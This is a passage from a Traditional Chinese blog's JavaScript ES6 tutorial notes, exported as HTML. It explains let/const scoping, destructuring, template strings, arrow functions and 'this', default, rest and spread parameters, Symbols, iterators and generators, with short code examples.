<h3 id="聲明方法的區別"><a href="#聲明方法的區別" class="headerlink" title="聲明方法的區別"></a>聲明方法的區別</h3><ol>
<li><p>使用<font color="#f54747"><code>var</code></font>聲明的變量，其作用域為<font color="#f54747">該語句所在的函數內，且存在變量提升現象</font></p>
</li>
<li><p>使用<font color="#f54747"><code>let</code></font>聲明的變量，其作用域為<font color="#f54747">該語句所在的代碼塊內，不存在變量提升</font></p>
</li>
<li><p>使用<font color="#f54747"><code>const</code></font>聲明的是常量，在後面出現的代碼中<font color="#f54747">不能再修改該常量的值</font></p>
</li>
</ol>
<table>
<thead>
<tr>
<th align="center"><code>var</code></th>
<th align="center"><code>let</code></th>
<th align="center"><code>const</code></th>
</tr>
</thead>
<tbody><tr>
<td align="center">函數級作用域</td>
<td align="center">塊級作用域</td>
<td align="center">塊級作用域</td>
</tr>
<tr>
<td align="center">變量提升</td>
<td align="center">不存在變量提升</td>
<td align="center">不存在變量提升</td>
</tr>
<tr>
<td align="center">值可更改</td>
<td align="center">值可更改</td>
<td align="center">值不可更改</td>
</tr>
</tbody></table>
<h2 id="解構賦值"><a href="#解構賦值" class="headerlink" title="解構賦值"></a>解構賦值</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 允許按照一定模式從數組和對象中提取值，對變量進行賦值</li>
</ul>
</li>
<li><p>數組解構</p>
<ul>
<li>數組解構允許我們按照一一對應的關係從數組中提取值，然後賦值給變量  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="keyword">let</span> [a, b, c] = arr         <span class="comment">// a = 1, b = 2, c = 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果解構不成功，變量的值為 undefined</span></span><br><span class="line"><span class="keyword">let</span> [a, b, c, d] = arr      <span class="comment">// d = undefined</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>對象解構</p>
<ol>
<li><p>變量名與屬性名相同</p>
<ul>
<li>對象解構允許我們使用變量的名字匹配對象的屬性，匹配成功將對象屬性賦值給變量  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;<span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">20</span>&#125;</span><br><span class="line"><span class="keyword">let</span> &#123;age, name&#125; = person    <span class="comment">// name = &#x27;Donald&#x27;, age = 20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果解構不成功，變量的值為 undefined   </span></span><br><span class="line"><span class="keyword">let</span> &#123;name, age, gender&#125; = person    <span class="comment">// gender = undefined</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>變量名與屬性名不同</p>
<ul>
<li>這種寫法將左側用於進行屬性匹配，匹配成功後將對象屬性賦值給右側的別名  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;<span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">20</span>&#125;</span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">name</span>: myName, <span class="attr">age</span>: myAge&#125;      <span class="comment">// myName = &#x27;Donald&#x27;, myAge = 20</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 引入新的聲明字符串的方式</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">`Hello World`</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>特性：</p>
<ol>
<li><p>內容中可以直接出現換行符</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">`&lt;ul&gt;</span></span><br><span class="line"><span class="string">        &lt;li&gt;Hello World 1&lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;li&gt;Hello World 2&lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;li&gt;Hello World 3&lt;/li&gt;</span></span><br><span class="line"><span class="string">    &lt;/ul&gt;`</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>變量拼接</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str1 = <span class="string">&#x27;Hello &#x27;</span></span><br><span class="line"><span class="keyword">let</span> str2 = <span class="string">`<span class="subst">$&#123;str1&#125;</span>World`</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str2)       <span class="comment">// Hello World</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="箭頭函數"><a href="#箭頭函數" class="headerlink" title="箭頭函數"></a>箭頭函數</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 允許使用箭頭來定義函數</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">fn</span> = (<span class="params">args</span>) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 函數體</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>特性：</p>
<ol>
<li><p><code>this</code>是靜態的</p>
<ul>
<li><p>在傳統函數中，<code>this</code>指向的是函數的<font color="#f54747">調用者</font></p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">name</span> = <span class="string">&#x27;Window&#x27;</span></span><br><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;Object&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getName</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">getName</span>()  <span class="comment">// Window</span></span><br><span class="line">getName.<span class="title function_">call</span>(person)   <span class="comment">// Object</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在箭頭函數中，<code>this</code>指向的是<font color="#f54747">函數聲明時所在作用域下的<code>this</code>指向</font><br>  箭頭函數沒有自己的<code>this</code>，如果在函數中調用<code>this</code>則指向箭頭函數定義位置的<code>this</code></p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">name</span> = <span class="string">&#x27;Window&#x27;</span></span><br><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;Object&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">getName</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">getName</span>()   <span class="comment">// Window</span></span><br><span class="line">getName.<span class="title function_">call</span>(person)    <span class="comment">// Window （函數永遠指向聲明時，函數所在作用域的 this 指向）</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>不能作為構造函數實例化對象</p>
<ul>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">Person</span> = (<span class="params">name, age</span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> donald = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;Donald&#x27;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(donald)     <span class="comment">// Person is not a constructor</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>不能使用<code>arguments</code>變量</p>
<ul>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">fn</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)   <span class="comment">// arguments is not defined</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>箭頭函數的簡寫</p>
<ol>
<li><p>省略<code>()</code>，當形參有且只有一個的時候</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">double</span> = n =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> n + n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>省略<code>&#123;&#125;</code>，當代碼體只有一條語句時（如果語句的執行結果就是函數的返回值，<code>return</code>必須省略）</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">square</span> = n =&gt; n * n</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
</li>
<li><p>箭頭函數的應用場景</p>
<ul>
<li>箭頭函數適用於：與<code>this</code>無關的回調，例如：定時器、數組的方法回調</li>
<li>箭頭函數不適用於：與<code>this</code>有關的回調，例如：DOM的事件回調、對象的方法</li>
</ul>
</li>
<li><p>箭頭函數面試題</p>
<ol>
<li>對象中箭頭函數的<code>this</code>指向問題 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    <span class="attr">age</span>:<span class="number">20</span>,</span><br><span class="line">    <span class="attr">say</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">age</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.<span class="title function_">say</span>()   <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    由於箭頭函數並沒有自己的 this 指向，而對象 obj 並不能產生作用域，因此箭頭函數實則被定義在全局作用域下</span></span><br><span class="line"><span class="comment">    所以在調用 say() 方法時，this 指向的是 Window，而 Window 並未聲明 age 屬性，因此返回 undefined</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="函數參數的默認設置"><a href="#函數參數的默認設置" class="headerlink" title="函數參數的默認設置"></a>函數參數的默認設置</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 允許給函數參數賦予初始值</li>
</ul>
</li>
<li><p>形參初始值</p>
<ul>
<li>能給形參設置初始化值</li>
<li>注：具有默認值的參數位置一半靠後</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b, c = <span class="number">10</span></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b + c</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">1</span>,<span class="number">2</span>))   <span class="comment">// 13</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>與解構賦值結合</p>
<ul>
<li>能在傳遞參數的時候同時使用解構賦值，節省使用<code>this</code>重新賦值</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">connect</span>(<span class="params">&#123;host=<span class="string">&#x27;127.0.0.1&#x27;</span>, username, password, port&#125;</span>)&#123;</span><br><span class="line">    <span class="comment">// let host = this.host</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(host)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(username)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">connect</span>(&#123;</span><br><span class="line">    <span class="comment">// host:&#x27;localhost&#x27;,</span></span><br><span class="line">    <span class="attr">username</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="attr">port</span>: <span class="number">3306</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="rest-參數"><a href="#rest-參數" class="headerlink" title="rest 參數"></a>rest 參數</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 引入<code>rest</code>參數，用於獲取函數的實參，用來代替<code>arguments</code></li>
</ul>
</li>
<li><p>ES5獲取實參的方法：</p>
<ul>
<li>利用<code>arguments</code>獲取實參</li>
<li>注：<code>arguments</code>並不是數組，是一個<font color="#f54747">對象</font></li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">students</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>)      </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">students</span>(<span class="string">&#x27;Donald&#x27;</span>, <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;May&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>rest</code>參數獲取實參：</p>
<ul>
<li>語法：<code>...args</code></li>
<li><code>args</code>是一個<font color="#f54747">數組</font>，因此可以使用數組的API方法，例如<code>filter()</code>、<code>map()</code>、<code>some()</code></li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">students</span>(<span class="params">...args</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(args)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">students</span>(<span class="string">&#x27;Donald&#x27;</span>, <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;May&#x27;</span>)   <span class="comment">// [&#x27;Donald&#x27;, &#x27;John&#x27;, &#x27;May&#x27;]</span></span><br></pre></td></tr></table></figure></li>
<li>注意：<font color="#f54747"><code>rest</code>參數必須放到參數的最後</font></li>
</ul>
</li>
<li><p><code>rest</code>參數配合解構使用：</p>
<ul>
<li>解構變量寫法也可以寫成剩餘參數的形式  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="keyword">let</span> [a1, ...args] = arr     <span class="comment">// a1 = 1, args = [2, 3, 4]</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="擴展運算符-spread"><a href="#擴展運算符-spread" class="headerlink" title="擴展運算符 spread"></a>擴展運算符 spread</h2><ol>
<li><p>簡介：</p>
<ul>
<li>將數組轉換為都好分隔的「參數序列」</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> students = [<span class="string">&#x27;Donald&#x27;</span>, <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;May&#x27;</span>]  <span class="comment">// =&gt; &#x27;Donald&#x27;, &#x27;John&#x27;, &#x27;May&#x27;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getName</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">getName</span>(students)       <span class="comment">// === getName([&#x27;Donald&#x27;, &#x27;John&#x27;, &#x27;May&#x27;])</span></span><br><span class="line"><span class="title function_">getName</span>(...students)    <span class="comment">// === getName(&#x27;Donald&#x27;, &#x27;John&#x27;, &#x27;May&#x27;)        </span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>應用：</p>
<ol>
<li><p>合併數組</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> boys = [<span class="string">&#x27;Donald&#x27;</span>, <span class="string">&#x27;John&#x27;</span>]</span><br><span class="line"><span class="keyword">const</span> girls = [<span class="string">&#x27;May&#x27;</span>, <span class="string">&#x27;Lily&#x27;</span>]</span><br><span class="line"><span class="keyword">const</span> students = boys.<span class="title function_">concat</span>(girls)     <span class="comment">// ES5 的數組API方法</span></span><br><span class="line"><span class="keyword">const</span> students = [...boys, ...girls]    <span class="comment">// === [&#x27;Donald&#x27;, &#x27;John&#x27;, &#x27;May&#x27;, &#x27;Lily&#x27;]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>複製數組</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> boys = [<span class="string">&#x27;Donald&#x27;</span>, <span class="string">&#x27;John&#x27;</span>]</span><br><span class="line"><span class="keyword">const</span> men = [...boys]</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：如果數組裡面的元素有引用類型數據，是<font color="#f54747">淺拷貝</font></li>
</ul>
</li>
<li><p>將偽數組轉為真數組</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> divs = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;div&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(divs)       <span class="comment">// NodeList</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([...divs])  <span class="comment">// Array</span></span><br></pre></td></tr></table></figure>
<ul>
<li>轉換之後，就可以使用數組的API方法</li>
</ul>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript - ES6 Data Types</title>
    <url>/myBlog/2022/07/25/2022/2022-7-25-JS-ES6DataTypes/</url>
    <content><![CDATA[<h2 id="Symbol-數據類型"><a href="#Symbol-數據類型" class="headerlink" title="Symbol 數據類型"></a>Symbol 數據類型</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 引入一種新的原始數據類型 Symbol ，表示獨一無二值</li>
<li>它是 JavaScript 的第七種數據類型，是一種類似於字符串的數據類型</li>
<li>用於給對象添加屬性和方法</li>
</ul>
</li>
<li><p>特點：</p>
<ol>
<li>Symbol 的值是唯一的，用來解決命名衝突問題</li>
<li>Symbol 的值不能與其他數據進行運算</li>
<li>Symbol 定義的對象屬性不能使用<code>for in</code>循環遍歷，但是可以使用<code>Reflect.ownKeys</code>來獲取對象的所有<code>key</code></li>
</ol>
</li>
</ol>
<h3 id="Symbol基本使用"><a href="#Symbol基本使用" class="headerlink" title="Symbol基本使用"></a>Symbol基本使用</h3><ol>
<li><p>創建：</p>
<ol>
<li><p>方式一：使用<code>Symbol()</code>創建</p>
<ul>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="title class_">Symbol</span>()</span><br></pre></td></tr></table></figure></li>
<li>可傳遞一個字符串作為描述字符串，通過字面意思來理解值（注釋）</li>
<li>描述字符串只是一個標誌，返回的值並不相同  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s1 = <span class="title class_">Symbol</span>(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> s2 = <span class="title class_">Symbol</span>(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s1 === s2)      <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>方式二、使用<code>Symbol.for()</code>創建</p>
<ul>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="title class_">Symbol</span>.<span class="title function_">for</span>()</span><br></pre></td></tr></table></figure></li>
<li>一樣可以傳遞描述字符串</li>
<li>而這種方式可以通過此描述字符串來得出唯一<code>Symbol</code>值  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s1 = <span class="title class_">Symbol</span>.<span class="title function_">for</span>(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> s2 = <span class="title class_">Symbol</span>.<span class="title function_">for</span>(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s1 === s2)      <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p>給對象添加方法</p>
<ol>
<li><p>在對象外添加方法</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> game = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> left = <span class="title class_">Symbol</span>(<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> methods = &#123;</span><br><span class="line">    <span class="attr">right</span>: <span class="title class_">Symbol</span>(<span class="string">&#x27;right&#x27;</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">game[left] = <span class="keyword">function</span>(<span class="params"></span>)&#123; ... &#125;</span><br><span class="line">game[methods.<span class="property">right</span>] = <span class="keyword">function</span>(<span class="params"></span>)&#123; ... &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在對象內添加方法</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> game = &#123;</span><br><span class="line">    [<span class="title class_">Symbol</span>(<span class="string">&#x27;left&#x27;</span>)]: <span class="keyword">function</span>(<span class="params"></span>)&#123; ... &#125;,</span><br><span class="line">    [<span class="title class_">Symbol</span>(<span class="string">&#x27;right&#x27;</span>)]: <span class="keyword">function</span>(<span class="params"></span>)&#123; ... &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h3 id="Symbol內置值"><a href="#Symbol內置值" class="headerlink" title="Symbol內置值"></a>Symbol內置值</h3><p>除了定義自己使用的<code>Symbol</code>值以外，ES6 提供了11個內置Symbol值，指向語言內部使用的方法</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>說明</th>
</tr>
</thead>
<tbody><tr>
<td><code>Symbol.hasInstance</code></td>
<td>當其他對象使用<code>instanceof</code>運算符，判斷是否為該對象的實例時，會調用這個方法</td>
</tr>
<tr>
<td><code>Symbol.isConcatSpreadable</code></td>
<td>是一個布爾值，表示該對象用於<code>Array.prototype.concat()</code>時，是否可以展開</td>
</tr>
<tr>
<td><code>Symbol.unscopables</code></td>
<td>該對象指定了使用<code>with</code>關鍵字時，哪些屬性會被<code>with</code>環境排除</td>
</tr>
<tr>
<td><code>Symbol.match</code></td>
<td>執行<code>str.match(obj)</code>時，如果該屬性存在，會調用它，返回該方法的返回值</td>
</tr>
<tr>
<td><code>Symbol.replace</code></td>
<td>當該對象被<code>str.replace(obj)</code>方法調用時，會返回該方法的返回值</td>
</tr>
<tr>
<td><code>Symbol.search</code></td>
<td>當該對象被<code>str.search(obj)</code>方法調用時，會返回該方法的返回值</td>
</tr>
<tr>
<td><code>Symbol.split</code></td>
<td>當該對象被<code>str.split(obj)</code>方法調用時，會返回該方法的返回值</td>
</tr>
<tr>
<td><code>Symbol.interator</code></td>
<td>對象進行<code>for...of</code>循環時，會調用這個方法，返回該對象的默認遍歷器</td>
</tr>
<tr>
<td><code>Symbol.toPrimitive</code></td>
<td>該對象被轉為原始類型的值時，會調用這個方法，返回該對象對應的原始類型值</td>
</tr>
<tr>
<td><code>Symbol.toStringTag</code></td>
<td>在該對象上面調用<code>toString</code>方法時，返回該方法的返回值</td>
</tr>
<tr>
<td><code>Symbol.species</code></td>
<td>創建衍生對象時，會使用該方法</td>
</tr>
</tbody></table>
<h2 id="迭代器-Iterator"><a href="#迭代器-Iterator" class="headerlink" title="迭代器 Iterator"></a>迭代器 Iterator</h2><ol>
<li><p>簡介：</p>
<ul>
<li>迭代器是一種接口，為各種不同的數據類型提供統一的訪問機制</li>
<li>任何數據結構只要部署迭代器接口，就可以完成遍歷操作</li>
<li>ES6 創造了一種新的遍歷命令<code>for...of</code>循環，迭代器接口主要供<code>for...of</code>消費</li>
<li>原生具備迭代器接口的數據（即可用<code>for...of</code>遍歷）<br>  <code>Array</code>, <code>Arguments</code>, <code>Set</code>, <code>Map</code>, <code>String</code>, <code>TypedArray</code>, <code>NodeList</code></li>
</ul>
</li>
<li><p>工作原理：</p>
<ol>
<li>創建一個指針對象，指向當前數據結構的起始位置</li>
<li>第一次調用對象的<code>next</code>方法（返回對象身上的<code>next</code>方法），指針會自動指向數據結構的第一個成員</li>
<li>接下來不斷調用<code>next</code>方法，指針一直往後移動，直到指向最後一個成員</li>
<li>每調用<code>next</code>方法返回一個包含<code>value</code>和<code>done</code>屬性的對象</li>
</ol>
<ul>
<li><font color="#f54747">注：需要自定義遍歷數據時，要想到迭代器</font></li>
</ul>
</li>
<li><p>實際應用：</p>
<ul>
<li>自定義迭代器，能給對象自定義一套<code>for...of</code>的遍歷規則</li>
<li>具體代碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> school = &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;CUHK&#x27;</span>,</span><br><span class="line">    <span class="attr">students</span>:[<span class="string">&#x27;Donald&#x27;</span>, <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;May&#x27;</span>, <span class="string">&#x27;Lily&#x27;</span>],</span><br><span class="line">    <span class="comment">// 1. 為對象配置迭代器</span></span><br><span class="line">    [<span class="title class_">Symbol</span>.<span class="property">iterator</span>]()&#123;</span><br><span class="line">        <span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line">        <span class="comment">// 2. 迭代器返回值是一個包含 next 方法的對象</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="comment">// 3. 配置對象的 next 方法</span></span><br><span class="line">            <span class="attr">next</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(index &lt; <span class="variable language_">this</span>.<span class="property">students</span>.<span class="property">length</span>)&#123;</span><br><span class="line">                    <span class="comment">// 4. next 方法返回值為一個包含 value 和 done 值的對象</span></span><br><span class="line">                    <span class="keyword">const</span> result = &#123;<span class="attr">value</span>: <span class="variable language_">this</span>.<span class="property">students</span>[index++], <span class="attr">done</span>: <span class="literal">false</span>&#125;</span><br><span class="line">                    <span class="keyword">return</span> result</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;<span class="attr">value</span>: <span class="literal">undefined</span>, <span class="attr">done</span>: <span class="literal">true</span>&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>這種遍歷形式符合面向對象概念，不直接調用對象身上的數組進行遍歷，而是透過聯繫對象自身方法遍歷數組</li>
</ul>
</li>
</ol>
<h2 id="生成器-Generator"><a href="#生成器-Generator" class="headerlink" title="生成器 Generator"></a>生成器 Generator</h2><ol>
<li><p>簡介：</p>
<ul>
<li>生成器函數是 ES6 提供的一種異步編程解決方案</li>
<li>語法行為與傳統函數完全不同</li>
</ul>
</li>
<li><p>使用方法：</p>
<ol>
<li><p>聲明生成器函數</p>
<ul>
<li>使用<code>function *</code>方式聲明生成器函數</li>
<li>使用<code>yield</code>語句作為分割符</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> * <span class="title function_">gen</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// Area 1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">111</span></span><br><span class="line">    <span class="comment">// Area 2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">222</span></span><br><span class="line">    <span class="comment">// Area 3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>調用函數</p>
<ul>
<li>與普通函數不同，必須使用<code>next</code>方法調用</li>
<li>每次調用<code>next()</code>方法，就會執行分割符<code>yield</code>及以上的代碼</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> iterator = <span class="title function_">gen</span>()</span><br><span class="line">iterator.<span class="title function_">next</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>參數傳遞</p>
<ul>
<li><code>next</code>方法是可以傳入實參，而實參就是<code>yield</code>語句的返回結果</li>
<li>而<font color="#f54747">第二次</font>調用<code>next</code>方法傳入的參數，將作為<font color="#f54747">第一個</font><code>yield</code>語句的返回結果，以此類推</li>
<li>如果要在第一個<code>yield</code>語句之前傳遞參數，則可以通過調用生成器<code>gen()</code>的時候傳入參數</li>
